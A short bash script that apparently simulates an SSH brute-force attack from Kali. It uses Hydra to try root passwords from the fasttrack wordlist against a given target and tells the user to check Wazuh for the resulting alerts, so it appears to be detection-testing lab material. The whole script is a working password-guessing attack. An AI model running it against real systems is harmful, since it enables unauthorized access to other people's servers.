#!/bin/bash
# SSH Brute Force Attack Simulation from Kali
# Usage: ./hydra-brute.sh <target_ip>

if [ -z "$1" ]; then
    echo "Usage: ./hydra-brute.sh <target_ip>"
    exit 1
fi

TARGET=$1
WORDLIST="/usr/share/wordlists/fasttrack.txt"

echo "[*] Starting SSH brute force attack on $TARGET"
echo "[*] Using wordlist: $WORDLIST"

# Single wrong password test
echo "[1] Single wrong password test"
hydra -l root -p wrongpassword ssh://$TARGET -t 1

# Multiple password attempts
echo "[2] Multiple password attempts"
hydra -l root -P $WORDLIST ssh://$TARGET -t 4 -V

echo "[*] Attack complete. Check Wazuh dashboard for rule 5710/5712 alerts."
